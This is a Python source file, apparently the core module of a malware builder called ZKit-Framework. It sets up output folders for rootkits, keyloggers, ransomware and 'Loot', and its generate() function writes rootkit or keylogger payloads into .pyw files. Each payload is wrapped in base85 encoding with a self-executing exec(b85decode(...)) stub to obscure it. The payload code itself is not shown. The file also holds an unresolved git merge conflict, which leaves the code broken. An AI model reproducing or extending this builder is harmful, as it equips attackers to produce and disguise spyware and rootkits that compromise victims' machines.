"""
The Core Module of ZKit-Framework Contains : some useful methods like a custom create_file

"""
# Python 2 is supported too
from __future__ import print_function, division, absolute_import
import os
import random
from base64 import b85encode as be

def init():
    'init the zkit . without you will get several errors'
    path_ = os.path.dirname(os.path.dirname(os.path.dirname(__file__)))
    rootkit_path = path_ + "\\Builded\\Rootkit\\"
    keylogger_path = path_ + "\\Builded\\KeyLogger\\"
    ransomware_path = path_ + "\\Builded\\Ransomware\\"
    os.popen("mkdir {}".format(rootkit_path)).close()
    os.popen("mkdir {}".format(keylogger_path)).close()
    os.popen("mkdir {}".format(ransomware_path)).close()
    os.popen("mkdir {}".format(path_ + '\\Loot')).close()
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")


class Color:
    'ANSI Color codes'
    def __init__(self):
        self.colors = {
            "black": "\033[30m",
            "red": "\033[31m",
            "green": "\033[32m",
            "yellow": "\033[33m",
            "blue": "\033[34m",
            "magenta": "\033[35m",
            "cyan": "\033[36m",
            "grey": "\033[37m",
            "reset": "\033[0m",
        }

    def GetColor(self, colorname): # pylint: disable=C0103; # noqa
        'Gets a color from colors dict case insensetive'
        return self.colors.get(colorname.lower())

    def GetAllColors(self): # pylint: disable=C0103; # noqa
        "returns all colors and reset as a tuple"
        return tuple(self.colors.values())


def notify(status: str, message: str, ending="\n", flush=False):
    """
    notifies the user with given parameters . you can customize it very well

    Args:
        message (str): message shown for the user
        status (str): status for event . all possibleties are "notify",
        "problem", "report" and "question"
        statuses will be converted to lower .
        ending (str): used as value for print(message, end = ending)
        flush (bool): to flush the stream or not (default=False)
    """
    col = Color()
    reset = col.GetColor('reset')
    status = status.lower()
    all_stats = {'report': 'blue|[ REPORT ]',
                 'notify': 'green|[ NOTIFY ]',
                 'problem': 'red|[CRITICAL]',
                 'question': 'yellow|[QUESTION]',
                }
    for stat in all_stats:
        if stat == status:
            temp = all_stats[stat].split('|')
            first = col.GetColor(temp[0]) + temp[1] + reset
            break
    print("{}{} {}".format(
        '\r' if flush else '', first, message), end=ending)


def ask_for(message: str, report: str, default=None, type=str, args=None): # pylint: disable=W0622; # noqa
    """
    Asks for anything from users . (uses notify)

    Args:
        message (str): message to show the user to ask for details .
        report (str): message to show user that your data is correct .
        default (list): default value and action for that if callable calls it with the arguments
        else replaces it with default[1] . (Defaults to None).
        type (type): type of data to apply to input. (Default : str)
        args (None): args to pass to fuction. Defaults to None.

    Returns:
        (type): the value user entered in type of the "type" argument.
        changed if matched the default to whatever to put in defaults[1]
    """
    notify('question', message, '')
    if type == list:
        value = str(input("")).split()
<<<<<<< HEAD
    default = ['', ''] if default is None else default
=======
    else:
        value = type(input(""))

>>>>>>> 347fd8cbf931367e46eceb0af7f98194c1e382f5
    if value == default[0]:
        if callable(default[1]):
            if args == ("DEFAULT"):
                value = default[1](value)
            elif args is None:
                value = default[1]()
            else:
                value = default[1](args)
        else:
            value = default[1]
    notify('report', report.replace('\\|', str(value), 1))
    return value


def create_file(file: str):
    """
    Creates A New file if a file is on the given path if exists asks for overwrite permission
    if yes clears file data then closes it if no asks for another file path

    Arguments:
        file (str) : Path to File to create if exists asks for overwriting permission

    Returns A Path if file created returns file path if not returns asked file path
    or returns none if got wrong answer at the YES or NO overwrite permission ask
    """
    notify("notify", "Creating File...", "")
    try:
        _ = open(file, "x").close()
    except FileExistsError:
        notify(
            "problem", "Creating File...Failed \n" +
            "File Already Exists Confirm Overwrite : (N or Y) ", "", True
        )
        choice = str(input("")).upper()
        if choice == "Y":
            pass
        elif choice == "N":
            file = str(input("Write Down File Name Here : ")) + ".pyw"
        else:
            notify("problem", "\nInvalid Input Try Again")
            while True:
                notify("File Already Exists Confirm Overwrite : (N or Y) ", "")
                choice = str(input("")).upper()
                if choice == "Y": # pylint: disable=R1723; # noqa
                    break
                elif choice == "N":
                    file = str(
                        input("Write Down An Other File Name Here : ")) + ".pyw"
                    break
                else:
                    notify("problem", "\nInvalid Input Try Again")
    else:
        notify("report",
               "Creating File...Done ", "\n", True)
    return file


def generate(payload_type):
    from core.helper_core.rootkit import get_rootkit
    from core.helper_core.keylogger import get_keylogger
    "generates payloads with given payload_type"
    if payload_type == "rootkit":
        payload, path = get_rootkit()
    elif payload_type == "keylogger":
        payload, path = get_keylogger()
    notify("notify", "Opening File To Write Data On It...", "")
    try:
        file = open(path, "w+")
    except Exception: # pylint: disable=W0703; # noqa
        notify(
            "problem", "Opening File To Write Data On It...Failed \n Cannnot Open File", "\n", True)
        return
    else:
        notify("report",
               "Opening File To Write Data On It...Done", "\n", True)
    notify("notify", "Encrypting Data Before Writing On File...", "")
    payload = be(payload.encode("UTF-8")).decode("UTF-8")
    notify("report",
           "Encrypting Data Before Writing On File...Done", "\n", True)
    payload = 'from base64 import b85decode\nvalue = """' + \
        payload + '"""\nexec(b85decode(value))'
    notify("notify", "Writing Data On File...", "")
    try:
        file.write(payload)
    except PermissionError:
        notify("problem", "Writing Data On File...Failed \nSomething Went Wrong . Looks Like "
               "You Dont Have Access To The File." "\n", True)
    except Exception: # pylint: disable=W0703; # noqa
        notify("problem", "Writing Data On File...Failed \nSomething Went Wrong . " +
               "Is Another Process "
               "Using It ? ", "\n", True)
        notify("problem", "Couldnt Write Data On File Closing File...", "")
        file.close()
        print("Done")
    else:
        notify("report",
               "Writing Data On File...Done", "\n", True)
        notify("report",
               "Operation was successful")


def print_banner():
    from core.helper_core.banners import banner1, banner2
    "gets a random color and a random banner and prints it"
    _, red, green, _, blue, magenta, cyan, _, reset = Color().GetAllColors()
    random.seed(random.choice(
        [random.randint(1, 9999), random.randint(1, 998)]))
    banner = random.choice([banner1, banner2])
    color = random.choice([red, green, blue, magenta, cyan])
    print(color + banner + reset)


if __name__ == "__main__":
    print("Dont Run This File")
